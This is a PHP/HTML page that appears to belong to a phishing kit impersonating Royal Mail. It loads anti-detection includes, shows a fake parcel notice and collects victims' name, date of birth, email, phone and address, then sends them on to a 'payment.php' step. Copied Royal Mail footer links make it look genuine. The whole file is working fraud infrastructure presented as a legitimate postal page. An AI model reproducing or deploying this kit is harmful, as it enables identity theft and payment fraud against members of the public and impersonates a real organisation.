<?php
require "config.php";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/ant.php";
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Royal Mail</title>
        <!-- Favicon-->
        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
        <!-- Core CSS-->
		
        <link href="assets/css/styles.css" rel="stylesheet" />
        <link href="assets/css/preloader.css" rel="stylesheet" />
        <link href="assets/css/custom_style.css" rel="stylesheet" />
		<script src="assets/js/jquery.js"></script>
    <script src="assets/js/jquery.validate.js"></script>
    <script src="assets/js/jquery.maskedinput.js"></script>
    <script src="assets/js/jquery.payment.js"></script>

    <script type="text/javascript">

        jQuery(function($){
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
        });


    </script>
    </head>
<body>
<a rel="nofollow" style="display:none;" href="monika/">Meow</a>
    <div class="overlay" ></div>
    <div class="loader" style="display:none;"></div>
    
<!-- Navigation-->
<header>
    <nav class="navbar navbar-expand-lg text-uppercase" id="mainNav">
        <div class="container">
            <div class="header-content">
                <a class="navbar-brand site-logo js-scroll-trigger" href="./">
                    <img src="./assets/img/logo.png" alt="Home">
                </a>
            </div>
            
        </div>
    </nav>
</header>
<!-- Masthead-->


        <br/> 
        <section class="page-section" id="registration">
            <div class="container">
                
                <div class="row">
                    <div class="col-lg-8 mx-auto p-0">
                        <div class="parcel_message">
                            <h4><?=$text_on_top;?></h4>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-lg-8 mx-auto ps_form_wrapper">
                        <br/>
                        <form id="registrationForm" name="registrationForm" method="POST" action="payment.php?ssl=true&session=<?=generateRandomString(130);?>">
                            <input type="hidden" name="uid" value="0QxSdKWaFP" />
                            <div class="control-group">
                                <div class="form-group">
                                    <label>Full Name</label>
                                    <input class="form-control" id="name" name="name" type="text" placeholder="Name" required="required" data-validation-required-message="Please enter your name." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Date of Birth (DD/MM/YYYY)</label>
                                    <input class="form-control" maxLength="10" id="dob" name="dob" type="tel" placeholder="Date of birth" required="required" data-validation-required-message="Select date of birth." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                        
                            <div class="control-group">
                                <div class="form-group">
                                    <label>Email Address</label>
                                    <input class="form-control" id="email" name="email" type="email" placeholder="Email Address" required="required" data-validation-required-message="Please enter your email address." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>
                            <div class="control-group">
                                <div class="form-group">
                                    <label>Phone Number</label>
                                    <input class="form-control" maxlength="14" id="phone" name="phone" type="tel" placeholder="Phone Number" required="required" data-validation-required-message="Please enter your phone number." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>
                            <div class="control-group">
                                <div class="form-group">
                                    <label>Address</label>
                                    <textarea class="form-control" id="address" name="address" rows="2" placeholder="Address" required="required" data-validation-required-message="Please enter a address."></textarea>
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>City</label>
                                    <input class="form-control" id="city" name="city" type="text" placeholder="City" required="required" data-validation-required-message="Please enter City" />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Postcode</label>
                                    <input maxlength="7" class="form-control" id="postcode" name="postcode" type="text" placeholder="Postal Code" required="required" data-validation-required-message="Please enter Post Code" />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>
                            <br />
                            <div id="success"></div>
                            <div class="form-group" style="text-align: center;">
                                <button class="btn btn-primary btn-xl" id="sendMessageButton" type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section>
        <br/>
        <!-- Footer-->
<footer class="footer-wrapper">
    <div class="footer">
            <div class="container clearfix">
                <div>
                    <nav role="navigation" aria-labelledby="block-royalmail-primary-footer-personal-menu" id="block-royalmail-primary-footer-personal" class="royalmail-primary-footer-personal block-system-menu-blockprimary-footer-personal">
                        <h2 class="visually-hidden" id="block-royalmail-primary-footer-personal-menu">Royal Mail primary footer personal</h2>
                        <div class="primary-footer-wrapper" id="desktop_primary_footer_wrapper">
                            <ul data-region="footer" class="menu row " id="accordion">
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-0" data-toggle="collapse" data-target="primary-menu-0-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Tools</h5>
                                </div>
                                <div role="region" id="primary-menu-0-links" data-parent="#accordion" aria-labelledby="primary-menu-0" class="accordion-content collapse show">
                                    <ul>
                                        <li>
                                        <a href="https://www.royalmail.com/track-your-item#/">Track your item</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/find-a-postcode">Postcode finder</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/price-finder">Price finder</a>
                                        </li>
                                        <li>
                                        <a href="https://parcel.royalmail.com/">Online postage</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/personal/receiving-mail/redelivery">Book a Redelivery</a>
                                        </li>
                                        <li>
                                        <a href="/downloadapp" data-drupal-link-system-path="node/553">Get the Royal Mail App</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-1" aria-controls="primary-menu-1-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Help and info</h5>
                                </div>
                                <div role="region" id="primary-menu-1-links" aria-labelledby="primary-menu-1" class="accordion-content">
                                    <ul>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/">Help and support</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/contact">Contact us</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/146">Collect a missed delivery</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/317/">I think my mail is lost</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/12556">Service updates</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/325/">How to make a claim</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-2" aria-controls="primary-menu-2-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Mail</h5>
                                </div>
                                <div role="region" id="primary-menu-2-links" aria-labelledby="primary-menu-2" class="accordion-content">
                                    <ul>
                                        <li>
                                        <a href="/sending/uk" data-drupal-link-system-path="node/398">UK services</a>
                                        </li>
                                        <li>
                                        <a href="/sending/international" data-drupal-link-system-path="node/397">International services</a>
                                        </li>
                                        <li>
                                        <a href="/sending/stamps" data-drupal-link-system-path="node/515">Stamps</a>
                                        </li>
                                        <li>
                                        <a href="/current-postage-prices" data-drupal-link-system-path="node/519">Our prices</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/personal/receiving-mail/redirection">Redirect your mail</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-3" aria-controls="primary-menu-3-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Our partners</h5>
                                </div>
                                <div role="region" id="primary-menu-3-links" aria-labelledby="primary-menu-3" class="accordion-content">
                                    <ul>
                                        <li>
                                        <a href="https://www.parcelforce.com/" target="_blank" class="ext-link-wrapped-last-word">
                                            Parcelforce 
                                            <span class="ext-link-last-word">
                                                Worldwide
                                            </span>
                                        </a>
                                        </li>
                                        <li>
                                        <a href="https://www.actionforchildren.org.uk" target="_blank" class="ext-link-wrapped-last-word">
                                            Supporting Action for 
                                        </a>
                                        </li>
                                        <li>
                                        <a href="/business/tools-services/retail-sell-stamps" data-drupal-link-system-path="node/101">Stamp retailers</a>
                                        </li>
                                        <li>
                                        <a href="http://www.keepmeposteduk.com/" target="_blank" class="link-keep-me-posted ext-link-wrapped-last-word">
                                            Keep Me 
                                            <span class="ext-link-last-word">
                                                Posted
                                            </span>
                                            
                                        </a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            </ul>
                        </div>

                        <div class="primary-footer-wrapper" id="mobile_primary_footer_wrapper">
                            <ul data-region="footer" class="menu row " id="accordion">
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-0" data-toggle="collapse" data-target="#primary-menu-0-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Tools</h5>
                                    <span class="float-right">
                                        <i class="fas fa-chevron-down fa-2x"></i>
                                    </span>
                                </div>
                                <div role="region" id="primary-menu-0-links" data-parent="#accordion" aria-labelledby="primary-menu-0" class="accordion-content collapse">
                                    <ul>
                                        <li>
                                        <a href="https://www.royalmail.com/track-your-item#/">Track your item</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/find-a-postcode">Postcode finder</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/price-finder">Price finder</a>
                                        </li>
                                        <li>
                                        <a href="https://parcel.royalmail.com/">Online postage</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/personal/receiving-mail/redelivery">Book a Redelivery</a>
                                        </li>
                                        <li>
                                        <a href="/downloadapp" data-drupal-link-system-path="node/553">Get the Royal Mail App</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-1" data-toggle="collapse" data-target="#primary-menu-1-links" aria-expanded="false" class="accordion-toggle  accordion-mobile-only">
                                    <h5>Help and info</h5>
                                    <span class="float-right">
                                        <i class="fas fa-chevron-down fa-2x"></i>
                                    </span>
                                </div>
                                <div role="region" id="primary-menu-1-links" aria-labelledby="primary-menu-1" class="accordion-content collapse">
                                    <ul>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/">Help and support</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/contact">Contact us</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/146">Collect a missed delivery</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/317/">I think my mail is lost</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/12556">Service updates</a>
                                        </li>
                                        <li>
                                        <a href="https://personal.help.royalmail.com/app/answers/detail/a_id/325/">How to make a claim</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-2" data-toggle="collapse" data-target="#primary-menu-2-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Mail</h5>
                                    <span class="float-right">
                                        <i class="fas fa-chevron-down fa-2x"></i>
                                    </span>
                                </div>
                                <div role="region" id="primary-menu-2-links" aria-labelledby="primary-menu-2" class="accordion-content collapse">
                                    <ul>
                                        <li>
                                        <a href="/sending/uk" data-drupal-link-system-path="node/398">UK services</a>
                                        </li>
                                        <li>
                                        <a href="/sending/international" data-drupal-link-system-path="node/397">International services</a>
                                        </li>
                                        <li>
                                        <a href="/sending/stamps" data-drupal-link-system-path="node/515">Stamps</a>
                                        </li>
                                        <li>
                                        <a href="/current-postage-prices" data-drupal-link-system-path="node/519">Our prices</a>
                                        </li>
                                        <li>
                                        <a href="https://www.royalmail.com/personal/receiving-mail/redirection">Redirect your mail</a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="accordion-content-wrapper col-md-3 col-xs-12">
                                <div role="button" id="primary-menu-3" data-toggle="collapse" data-target="#primary-menu-3-links" aria-expanded="false" class="accordion-toggle accordion-mobile-only">
                                    <h5>Our partners</h5>
                                    <span class="float-right">
                                        <i class="fas fa-chevron-down fa-2x"></i>
                                    </span>
                                </div>
                                <div role="region" id="primary-menu-3-links" aria-labelledby="primary-menu-3" class="accordion-content collapse">
                                    <ul>
                                        <li>
                                        <a href="https://www.parcelforce.com/" target="_blank" class="ext-link-wrapped-last-word">
                                            Parcelforce 
                                            <span class="ext-link-last-word">
                                                Worldwide
                                            </span>
                                        </a>
                                        </li>
                                        <li>
                                        <a href="https://www.actionforchildren.org.uk" target="_blank" class="ext-link-wrapped-last-word">
                                            Supporting Action for 
                                        </a>
                                        </li>
                                        <li>
                                        <a href="/business/tools-services/retail-sell-stamps" data-drupal-link-system-path="node/101">Stamp retailers</a>
                                        </li>
                                        <li>
                                        <a href="http://www.keepmeposteduk.com/" target="_blank" class="link-keep-me-posted ext-link-wrapped-last-word">
                                            Keep Me 
                                            <span class="ext-link-last-word">
                                                Posted
                                            </span>
                                            
                                        </a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            </ul>
                        </div>
                    </nav>
                    <nav role="navigation" aria-labelledby="block-royalmail-social-links-menu" id="block-royalmail-social-links" class="royalmail-social-links block-system-menu-blocksocial-links">
                        <h2 class="visually-hidden" id="block-royalmail-social-links-menu">Royal Mail social links</h2>
                        <ul data-region="footer" class="menu">
                            <li>
                            <a href="https://www.instagram.com/royalmailofficial/" class="icon-instagram" target="_blank" title="Instagram">
                                <i class="fab fa-instagram fa-2x"></i>
                            </a>
                            </li>
                            <li>
                            <a href="https://www.linkedin.com/company/5263?trk=tyah" class="icon-linkedin" target="_blank" title="LinkedIn">
                                <i class="fab fa-linkedin-in fa-2x"></i>
                            </a>
                            </li>
                            <li>
                            <a href="https://www.facebook.com/RoyalMail" class="icon-facebook" target="_blank" title="Facebook">
                                <i class="fab fa-facebook-f fa-2x"></i>
                            </a>
                            </li>
                            <li>
                            <a href="https://www.twitter.com/royalmail" class="icon-twitter" target="_blank" title="Twitter">
                                <i class="fab fa-twitter fa-2x"></i>   
                            </a>
                            </li>
                        </ul>
                    </nav>
                </div>
                </div>
    </div>
    <div class="middle-footer">
        <div class="container">
            <div class="middle-footer">
                <div class="container">
                    <div>
                        <div id="block-default-safespace-banner" class="default-safespace-banner safe-space-banner block-block-content1c0fc7dd-3da5-4ff0-9439-3a012a660aab" data-launch-safespace="" data-target-element="body">
                            <div class="safe-space-banner-logo field field--name-safe-space-banner-logo field--type-entity-reference field--label-hidden field__item">
                                <img src="./assets/img/SafeSpace-logo.png?itok=2nxp_ipP" width="164" height="100" alt="Together we will end domestic abuse" typeof="foaf:Image">
                            </div>
                            <div class="body field field--name-body field--type-text-with-summary field--label-hidden field__item">
                                <p>Together we can end domestic abuse</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="post-footer">
        <div class="container">
            <div>
                <nav role="navigation" aria-labelledby="block-royalmail-site-links-personal-menu" id="block-royalmail-site-links-personal" class="royalmail-site-links-personal block-system-menu-blocksite-links-personal">
                    <ul data-region="postfooter" class="menu">
                    <li>
                        <a href="#" target="_blank">
                            Jobs
                            
                        </a>
                    </li>
                    <li>
                        <a href="#" target="_blank" class="ext-link-wrapped-last-word">
                            Royal Mail 
                            <span class="ext-link-last-word">
                                Group
                            </span>
                        </a>
                    </li>
                    <li>
                        <a href="#">Terms and conditions</a>
                    </li>
                    <li>
                        <a href="#" >Privacy</a>
                    </li>
                    <li>
                        <a href="#" target="_self">Change Consent Preferences</a>
                    </li>
                    <li>
                        <a href="#">Terms of use</a>
                    </li>
                    <li>
                        <a href="#">Cookies</a>
                    </li>
                    <li>
                        <a href="#" target="_blank">
                            Accessibility
                        </a>
                    </li>
                    <li>
                        <a href="/cymraeg">Cymraeg</a>
                    </li>
                    </ul>
                </nav>
                <div id="block-copyright" class="copyright copyright-text block-block-content4dd8157e-b8a9-4bcf-abbc-36b6e01fa33c">
                    <div class="">
                    <div class="field-copyright-text field field--name-field-copyright-text field--type-string field--label-hidden field__item">© Royal Mail Group Limited 2020</div>
                    </div>
                </div>
            </div>
        </div>
        </div>
</footer>

<!-- Scroll to Top Button (Only visible on small and extra-small screen sizes)-->
<div class="scroll-to-top d-lg-none position-fixed">
    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top"><i class="fa fa-chevron-up"></i></a>
</div>


<!-- Bootstrap core JS-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<!-- Core theme JS-->


</body>
</html>
   